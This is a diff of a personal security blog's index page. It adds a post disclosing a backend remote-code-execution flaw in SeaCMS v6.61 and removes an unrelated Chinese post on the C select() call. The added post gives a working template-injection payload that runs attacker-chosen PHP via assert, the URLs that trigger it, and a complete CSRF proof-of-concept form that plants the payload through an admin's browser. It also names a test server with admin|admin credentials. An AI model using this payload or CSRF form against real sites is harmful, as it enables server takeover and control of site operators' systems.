@@ -317,6 +317,191 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/seacms-backend-getshell/index.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/post/seacms-backend-getshell/index.html" itemprop="url">
+                  seacms backend getshell
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-07-18 11:30:58" itemprop="dateCreated datePublished" datetime="2018-07-18T11:30:58+08:00">2018-07-18</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="backend-RCE-in-the-latest-version-of-SeaCMS-v6-61"><a href="#backend-RCE-in-the-latest-version-of-SeaCMS-v6-61" class="headerlink" title="backend RCE in the latest version of SeaCMS(v6.61)"></a>backend RCE in the latest version of SeaCMS(v6.61)</h1><p>In SeaCMS’s admin platform, just in the page of publishing movies,due to the low limitation of the code injected in the picture’s url,we can execute random code to getshell.though there are some way’s in the /include/main.class to limit the usage of the code,we can find ways to bypass it.<br>So How does this vul be triggerd? here are some Steps:  </p>
+<ul>
+<li>Firstly login to the admin panel, in this case the admin directory is adjusted to <code>/backend</code>.<br><img src="http://p7lc13qga.bkt.clouddn.com/backend.PNG" alt=""></li>
+<li>Secondly add a movie and set it’s pictrue address as <code>{if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);//}{end if}</code><br><img src="http://p7lc13qga.bkt.clouddn.com/add.png" alt=""></li>
+<li>After adding it visit <code>/details/index.php?1.html&amp;m=admin&amp;a=assert&amp;b=phpinfo();</code>you can find <code>phpinfo()</code> is executed.<br>here 1.html refers to the id of the video you have just added.In my case, the video’s id is 2 so I executed as 2.html.<br><img src="http://p7lc13qga.bkt.clouddn.com/vul.PNG" alt=""></li>
+<li>Or you can just visit <code>/search.php?searchtype=5&amp;tid=0&amp;a=assert&amp;b=phpinfo();</code>or any other places that display the video’s pic you have just added.</li>
+</ul>
+<p>Also in the adding movie page it has no csrf protection so we can use CSRF to attacked it.<br>csrf poc is here:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- adjust action to your url --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/seacms/backend/admin_video.php?action=save&amp;acttype=add"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;commend"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;name"</span> <span class="attr">value</span>=<span class="string">"getshell"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;enname"</span> <span class="attr">value</span>=<span class="string">"ceshi"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;color"</span> <span class="attr">value</span>=<span class="string">"&amp;#35;FF0000"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;type"</span> <span class="attr">value</span>=<span class="string">"5"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;state"</span> <span class="attr">value</span>=<span class="string">"5"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;pic"</span> <span class="attr">value</span>=<span class="string">"&#123;if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//&#125;&#123;end if&#125;"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;spic"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;gpic"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;actor"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;director"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;commend"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;note"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;tags"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select3"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;publishyear"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select2"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;lang"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select1"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;publisharea"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select4"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;ver"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;hit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;monthhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;weekhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;dayhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;len"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;total"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;nickname"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;company"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;tvs"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;douban"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;mtime"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;imdb"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;score"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;scorenum"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;longtxt"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;money"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;psd"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;playfrom&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;playurl&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"m&amp;#95;downfrom&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"m&amp;#95;downurl&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;content"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Submit"</span> <span class="attr">value</span>=<span class="string">"�&amp;#161;&amp;#174;�&amp;#174;&amp;#154;�&amp;#143;&amp;#144;浜&amp;#164;"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>you can test this vul at <code>http://111.230.11.248:10089/backend/</code>,and the username and password is admin|admin.</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/pwn的初体验-qctf-Xman-stack2-writeup/index.html">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -2647,437 +2832,6 @@ YEARWEEK()
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/thinkings-on-select/index.html">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Imagemlt">
-      <meta itemprop="description" content="personal blog">
-      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Image's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/thinkings-on-select/index.html" itemprop="url">
-                  对select()的理解
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2017-12-15 00:56:25" itemprop="dateCreated datePublished" datetime="2017-12-15T00:56:25+08:00">2017-12-15</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
-
-                
-                
-                  , 
-                
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>
-
-                
-                
-                  , 
-                
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/人生杂谈/技术学习/" itemprop="url" rel="index"><span itemprop="name">技术学习</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>断断续续的看<strong>Beej’s Guide to Network Programming</strong>这本小册子,最近看了select函数的用法,感觉这个函数挺有用而且听特殊,理解上有点儿难度,因此记录下来关于这个函数的一些东西.</p>
-</blockquote>
-<h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><pre><code>#include &lt;sys/time.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;unistd.h&gt;
-int select(int numfds, fd_set *readfds, fd_set *writefds,
-fd_set *exceptfds, struct timeval *timeout);
-</code></pre><h3 id="fd-set"><a href="#fd-set" class="headerlink" title="fd_set"></a><code>fd_set</code></h3><p>这里的fd_set类型相当于一个file descriptor的集合.<br>当select()函数返回时,readfs中只含有可以读的file descriptor.writefs包含可写的descriptor,exceptfds包含出错的file descriptor .(此三个参数不必都有) fd_set有一些列的操作函数:</p>
-<pre><code>FD_SET(int fd, fd_set *set); //Add fd to the set .
-FD_CLR(int fd, fd_set *set); //Remove fd from the set .
-FD_ISSET(int fd, fd_set *set); //Return true if fd is in the set .
-FD_ZERO(fd_set *set); //Clear all entries from the set .
-</code></pre><h3 id="timeval结构体"><a href="#timeval结构体" class="headerlink" title="timeval结构体"></a><code>timeval</code>结构体</h3><pre><code>struct timeval {
-int tv_sec; //seconds
-int tv_usec;// microseconds
-};
-</code></pre><p>此结构体表示select函数的超时时间.设置为NULL则永远等待. 此函数使用时,numfds应设置为最高的file descriptor的值.</p>
-<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>返回set中最后剩下的的数目.0表示超时,-1表示出错.</p>
-<h2 id="此函数如何使用的理解"><a href="#此函数如何使用的理解" class="headerlink" title="此函数如何使用的理解"></a>此函数如何使用的理解</h2><p>我们可以在开始的时候使用<code>FD_SET</code>将我们创建的服务端套接字描述符填入一个fd_set中,然后把这个fd_set复制一下传如select的readfds参数中然后用select监听,select有返回值后则遍历所有descriptors</p>
-<ul>
-<li>如果这个descriptor在这个新的readfds中(<code>FD_ISSET</code>)则说明可以read<ul>
-<li>如果这个descriptor正好是我们最初的那个服务端套接字  <ul>
-<li>则可以进行accept操作,然后将读到的这个socksetfd就可以传入我们的fd_set中,判断这个socketfd是否比原有的最大的socketfd大,大则替换<code>select()</code>函数的第一个参数为这个新的socketfd+1.</li>
-</ul>
-</li>
-<li>如果这个descriptor不是最初的那个服务端套接字<ul>
-<li>则说明是与某个主机的一个连接,则可以调用这个套接字的<code>recv()</code>方法接收数据,如果返回0说明这个套接字已经断开,可调用<code>FD_CLR</code>将其从最初的fd_set中清除出去.否则则进行其他的一些列操作.</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="一个简单的demo"><a href="#一个简单的demo" class="headerlink" title="一个简单的demo"></a>一个简单的demo</h2><pre><code>/*
-** ChatServer.cpp - a practise on select()
-*/
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;sys/socket.h&gt;
-#include &lt;arpa/inet.h&gt;
-#include &lt;netdb.h&gt;
-
-#define PORT &quot;3456&quot;
-#define STDIN 0
-
-void *get_in_addr(struct sockaddr *sa)
-{
-    if (sa-&gt;sa_family == AF_INET)
-    {
-        return &amp;(((struct sockaddr_in *)sa)-&gt;sin_addr);
-    }
-    else
-        return &amp;(((struct sockaddr_in6 *)sa)-&gt;sin6_addr);
-}
-
-int main(void)
-{
-    fd_set master;
-    fd_set read_fds;
-    int fd_max;
-
-    int listener;
-    int newfd;
-    struct sockaddr_storage remoteaddr;
-    socklen_t addrlen;
-
-    char buf[256];
-    char mess[256];
-    int nbytes;
-
-    char remoteIP[INET6_ADDRSTRLEN];
-
-    int yes = 1;
-    int i, j, rv;
-    struct addrinfo hints, *ai, *p;
-
-    FD_ZERO(&amp;master);
-    FD_ZERO(&amp;read_fds);
-
-    memset(&amp;hints, 0, sizeof hints);
-    hints.ai_family = AF_UNSPEC;
-    hints.ai_socktype = SOCK_STREAM;
-    hints.ai_flags = AI_PASSIVE;
-    if ((rv = getaddrinfo(NULL, PORT, &amp;hints, &amp;ai)) != 0)
-    {
-        fprintf(stderr, &quot;selectserver:%s\n&quot;, gai_strerror(rv));
-        exit(1);
-    }
-
-    for (p = ai; p != NULL; p = p-&gt;ai_next)
-    {
-        listener = socket(p-&gt;ai_family, p-&gt;ai_socktype, p-&gt;ai_protocol);
-        if (listener &lt; 0)
-        {
-            continue;
-        }
-        setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &amp;yes, sizeof(int));
-        if (bind(listener, p-&gt;ai_addr, p-&gt;ai_addrlen) &lt; 0)
-        {
-            close(listener);
-            continue;
-        }
-        break;
-    }
-    if (p == NULL)
-    {
-        fprintf(stderr, &quot;selectserver: failed to bind\n&quot;);
-        exit(2);
-    }
-    freeaddrinfo(ai);
-    if (listen(listener, 10) == -1)
-    {
-        perror(&quot;listen&quot;);
-        exit(3);
-    }
-    FD_SET(listener, &amp;master);
-    FD_SET(STDIN, &amp;master);
-    fd_max = listener &gt; STDIN ? listener : STDIN;
-
-    for (;;)
-    {
-        read_fds = master;
-        if (select(fd_max + 1, &amp;read_fds, NULL, NULL, NULL) == -1)
-        {
-            perror(&quot;select&quot;);
-            exit(4);
-        }
-        for (i = 0; i &lt;= fd_max; i++)
-        {
-            if (FD_ISSET(i, &amp;read_fds))
-            { //we got one!!
-                if (i == STDIN)
-                {
-                    fgets(buf, sizeof buf, stdin);
-                    memset(mess, 0, sizeof mess);
-                    sprintf(mess, &quot;server said:%s&quot;, buf);
-                    for (j = 0; j &lt;= fd_max; j++)
-                    {
-                        if (FD_ISSET(j, &amp;master))
-                        {
-                            if (j != listener &amp;&amp; j != i &amp;&amp; j != STDIN)
-                            {
-                                if (send(j, mess, strlen(mess), 0) == -1)
-                                {
-                                    perror(&quot;send&quot;);
-                                }
-                            }
-                        }
-                    }
-                }
-                else if (i == listener)
-                {
-                    addrlen = sizeof remoteaddr;
-                    newfd = accept(listener, (struct sockaddr *)&amp;remoteaddr, &amp;addrlen);
-                    if (newfd == -1)
-                    {
-                        perror(&quot;accept&quot;);
-                    }
-                    else
-                    {
-                        FD_SET(newfd, &amp;master);
-                        if (newfd &gt; fd_max)
-                        {
-                            fd_max = newfd;
-                        }
-                        printf(&quot;selectserver:new connection from %s on socket %d\n&quot;,
-                               inet_ntop(remoteaddr.ss_family, get_in_addr((struct sockaddr *)&amp;remoteaddr), remoteIP, INET6_ADDRSTRLEN), newfd);
-                        sprintf(buf, &quot;hello!!! your socket id is %d\n&quot;, newfd);
-                        if (send(newfd, buf, strlen(buf), 0) == -1)
-                        {
-                            perror(&quot;send&quot;);
-                        }
-                        sprintf(buf, &quot;socket %d joined chatroom\n&quot;, newfd);
-                        for (j = 0; j &lt; fd_max; j++)
-                        {
-                            if (FD_ISSET(j, &amp;master))
-                            {
-                                if (j != i &amp;&amp; j != listener &amp;&amp; j != STDIN)
-                                {
-                                    if (send(j, buf, strlen(buf), 0) == -1)
-                                        perror(&quot;send&quot;);
-                                }
-                            }
-                        }
-                    }
-                }
-                else
-                {
-                    if ((nbytes = recv(i, buf, sizeof buf, 0)) &lt;= 0)
-                    {
-                        if (nbytes == 0)
-                        {
-                            sprintf(buf, &quot;select server: socket %d hung up\n&quot;, i);
-                            printf(&quot;%s&quot;, buf);
-                            for (j = 0; j &lt;= fd_max; j++)
-                            {
-                                if (FD_ISSET(j, &amp;master))
-                                    if (j != listener &amp;&amp; j != i &amp;&amp; j != STDIN)
-                                    {
-                                        if (send(j, buf, strlen(buf), 0) == -1)
-                                        {
-                                            perror(&quot;send&quot;);
-                                        }
-                                    }
-                            }
-                        }
-                        else
-                        {
-                            perror(&quot;recv&quot;);
-                        }
-                        close(i);
-                        FD_CLR(i, &amp;master);
-                    }
-                    else
-                    {
-                        if (nbytes &lt;= 2)
-                            nbytes = 3;
-                        memset(mess, 0, sizeof mess);
-                        strncpy(mess, buf, nbytes - 2);
-                        printf(&quot;recv data %s from socket %d\n&quot;, mess, i);
-                        sprintf(buf, &quot;socket %d says: %s\n&quot;, i, mess);
-                        for (j = 0; j &lt;= fd_max; j++)
-                        {
-                            if (FD_ISSET(j, &amp;master))
-                            {
-                                if (j != listener &amp;&amp; j != i &amp;&amp; j != STDIN)
-                                {
-                                    if (send(j, buf, strlen(buf), 0) == -1)
-                                    {
-                                        perror(&quot;send&quot;);
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }
-    }
-    return 0;
-}
-</code></pre><blockquote>
